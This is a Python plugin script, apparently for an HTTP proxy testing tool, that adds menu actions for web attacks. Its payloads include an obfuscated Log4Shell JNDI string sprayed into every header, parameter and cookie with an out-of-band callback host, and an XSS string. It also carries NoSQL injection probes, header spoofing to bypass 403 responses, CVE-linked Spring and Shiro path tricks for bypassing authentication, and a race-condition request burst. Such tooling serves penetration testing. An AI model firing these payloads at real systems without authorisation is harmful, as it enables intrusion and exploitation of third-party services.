import copy
import json


pool = RequestPool(20)
canary = getOOBCanary()
print(canary)


def handleInteraction(interaction):
    print(interaction.clientIp().toString() + ":" + str(interaction.clientPort()) + "\t" + interaction.dnsDetails().get().query().toString())


@run_in_thread
def send_with_proxy(request):
    sendWithProxy(request, "127.0.0.1", 8080)


def insert_at_cursor():
    return "'\"><img/src/onerror=alert(1)>${jndi:ldap://inseratcursor." + canary + "/a}"


def json_dumps(selectedText):
    return json.dumps(json.loads(selectedText), ensure_ascii=True, indent=2)


def bypass403(messageEditor):
    request = messageEditor.requestResponse().request()
    xheaders = ["X-Forwarded-For", "X-Originating-IP", "X-Remote-Addr", "X-Remote-IP", "X-Remote-Addr", "X-Real-IP", "X-Forwarded-Host", "X-Client-IP", "X-Host"]
    for header in xheaders:
        request = request.withHeader(header, "127.0.0.1")
    messageEditor.setRequest(request)


def removeBoringHeaders(editor):
    request = editor.requestResponse().request()
    boring_headers = ["Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Fetch-Site", "Sec-Fetch-Mode", "Sec-Fetch-Dest", "Priority"]
    for header in boring_headers:
        request = request.withRemovedHeader(header)
    editor.setRequest(request)

# When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
# until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
# the main thread can continue executing other tasks without being blocked.
@run_in_thread
def race_condition_10(request):
    print("race condition requests:", request.url())
    sendRequests([request] * 10)


def log4shell(request):
    print("log4shell requests: ", request.url())
    host = request.httpService().host()
    payload = "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//" + host + "." + canary + "/log4shell}"  # Replace it
    pool.run(sendRequest, modifyAllParamsValue(request, payload, [HttpParameterType.COOKIE]))
    pool.run(sendRequest, modifyAllParamsValue(request, payload))
    for header in request.headers():
        if header.name().lower() not in ["cookie", "host", "content-length"]:
            request = request.withHeader(header.name(), payload)
    pool.run(sendRequest, request)


def insert_to_reflect_params(messageEditor):
    payload = "REFLECT_PARAMS_<img/src=x>"
    request = messageEditor.requestResponse().request()
    response = messageEditor.requestResponse().response()
    if response is None:
        print("response not found")
        return
    body = response.bodyToString()
    for param in request.parameters():
        if (param.type() == HttpParameterType.BODY or param.type() == HttpParameterType.URL) and (param.value() in body or urldecode(param.value()) in body):
            request = request.withRemovedParameters(param).withParameter(parameter(param.name(), payload, param.type()))
    messageEditor.setRequest(request)


@run_in_pool(pool)
def no_sql_request(request):
    requestResponse = sendRequest(request)
    if requestResponse.response() is None:
        return
    body = requestResponse.response().bodyToString()
    for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field", "expression is invalid"]:
        if highlight in body:
            addIssue(auditIssue("NoSQL Injection", "String detail", "String remediation", requestResponse.request().url(),
                                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                                "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse.withResponseMarkers(getResponseHighlights(requestResponse, highlight))))
            break


def noSqliScan(request):
    print("nosql scan: ", request.url())
    if request.body().length() > 5 and request.contentType() == ContentType.JSON:
        try:
            json_obj = json.loads(request.bodyToString().encode("utf-8"))
        except Exception:
            print(request.url(), "json loads error")
        else:
            for payload in traverse_and_modify(json_obj, {"$83b3j45b": "xxx"}):
                no_sql_request(request.withBody(json.dumps(payload)))
    if len(request.parameters()) > 0:
        for param in request.parameters():
            paramType = param.type()
            if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
                #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
                no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))


def middle_bypass_poc(path1 ,path2):
    middles = ["/;/",  # https://evilpan.com/2023/08/19/url-gotchas-spring/#bypass-tricks
               "\\",
               "/foo/..;/",
               "//",
               "/foo/.././/",
               "/%20/%20//%20",
               "%20/", # spring CVE-2016-5007
               "/%0d", # spring CVE-2016-5007
               ]
    return_pocs = []
    for middle in middles:
        return_pocs.append(path1 + middle + path2)

    # special https://evilpan.com/2023/08/19/url-gotchas-spring/#bypass-tricks
    return_pocs.append(path1 + '/' + '%%%02x' % ord(path2.lstrip('/')[:1]) + path2[1:])
    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1].upper() + path2[1:])
    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1].lower() + path2[1:])
    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1] + '%0d' + path2[1:]) # shiro cve-2022-32532
    return return_pocs


def suffix_bypass_poc(path):
    only_suffix_poc = []
    suffixs = ['/', # shiro cve-2021-41303
               "/.", # shiro CVE-2020-17510
               "/%2e", # shiro CVE-2020-17510
               "/%20", # shiro CVE-2020-17523
               "%0d%0a", # shiro CVE-2022-22978
               '?',
               ';a=b',
               ';.css',
               '\x09', # https://mp.weixin.qq.com/s/DKVygLtFCmkCs1wycuH70w
               ';',
               #                '\x85',
               #                '\xA0',
               #                '\x0C',
               ]
    for suffix in suffixs:
        only_suffix_poc.append(path.rstrip("/") + suffix)
    return only_suffix_poc


def process_path_list(path, nest_level):
    parts = path.strip('/').split('/')
    if len(parts) < 2:
        print("spring bypass: path nest level need great than {}".format(nest_level))
        return []
    pocs = suffix_bypass_poc(path)

    path1, path2 = '', path.lstrip('/')
    pocs.extend(middle_bypass_poc(path1, path2))
    for i in range(nest_level-1):
        if i+1 > len(parts):
            break
        path1, path2 = '/' + '/'.join(parts[:i+1]), '/'.join(parts[i+1:])
        pocs.extend(middle_bypass_poc(path1, path2))
    return pocs

@run_in_thread
def router_bypass(request, response):
    print("send spring bypass requests:", request.url())
    origin_status_code = response.statusCode()
    origin_content_length = len(response.bodyToString())

    nest_level = 2
    for poc_path in process_path_list(request.path(), nest_level):
        requestResponse = sendRequest(request.withPath(poc_path))
        if requestResponse.response() is None:
            continue
        response = requestResponse.response()
        new_status_code = response.statusCode()
        new_content_length = len(response.bodyToString())
        if new_status_code not in [400, 404, 0] and ((origin_status_code != new_status_code and new_status_code == 200) or origin_content_length != new_content_length):
            #            print(requestResponse.request().url())
            addIssue(auditIssue("spring authentication bypass", "String detail", "String remediation",request.url(),
                                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                                "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse))


# This code snippet is generated by OpenAI's ChatGPT language model.
def traverse_and_modify(node, new_value):
    result = []
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                sub_results = traverse_and_modify(value, new_value)
                for sub_result in sub_results:
                    new_node = copy.deepcopy(node)
                    new_node[key] = sub_result
                    result.append(new_node)
            else:
                new_node = copy.deepcopy(node)
                new_node[key] = new_value
                result.append(new_node)
    elif isinstance(node, list):
        for i in range(len(node)):
            if isinstance(node[i], (dict, list)):
                sub_results = traverse_and_modify(node[i], new_value)
                for sub_result in sub_results:
                    new_node = copy.deepcopy(node)
                    new_node[i] = sub_result
                    result.append(new_node)
    else:
        result.append(node)
    return result


def traverse_and_modify_all(node, new_value):
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                traverse_and_modify_all(value, new_value)
            else:
                node[key] = new_value
    elif isinstance(node, list):
        for item in node:
            traverse_and_modify(item, new_value)


def modifyAllParamsValue(request, value, excluded=[]):
    body = request.bodyToString().encode("utf8")
    if request.contentType() == ContentType.JSON and len(body) > 5:
        try:
            json_body = json.loads(body)
            traverse_and_modify_all(json_body, value)
            request = request.withBody(json.dumps(json_body))
        except Exception:
            print(request.url(), "json loads error")
    for param in request.parameters():
        excluded.append(HttpParameterType.JSON)
        if param.type() in excluded:
            continue
        request = request.withParameter(parameter(param.name(), value, param.type()))
    return request


def registerContextMenu(menus):
    """
    To register a custom context menu using the register method,
    three parameters need to be passed: the menu name, the menu function, and the menu type.
    The menu types include CARET, SELECTED_TEXT, REQUEST, REQUEST_RESPONSE and MESSAGE_EDITOR.
    """
    menus.register("Bypass 403", bypass403, MenuType.MESSAGE_EDITOR)
    menus.register("Find Reflect Params", insert_to_reflect_params, MenuType.MESSAGE_EDITOR)
    menus.register("Purify Headers", removeBoringHeaders, MenuType.MESSAGE_EDITOR)

    menus.register("JSON Format", json_dumps, MenuType.SELECTED_TEXT)
    menus.register("JSON Quotes", lambda s: json.dumps(s, ensure_ascii=False), MenuType.SELECTED_TEXT)
    menus.register("Unicode Escape", lambda s: s.decode().decode('unicode_escape'), MenuType.SELECTED_TEXT)

    menus.register("Send With Proxy", send_with_proxy, MenuType.REQUEST)
    menus.register("NoSQL Injection", noSqliScan, MenuType.REQUEST)
    menus.register("Send Log4Shell Reqeusts", log4shell, MenuType.REQUEST)
    menus.register("Race Condition x10", race_condition_10, MenuType.REQUEST)

    menus.register("XSS At Cursor", insert_at_cursor, MenuType.CARET)

    menus.register("Spring Bypass", router_bypass, MenuType.REQUEST_RESPONSE)


def finish():
    pool.shutdown()
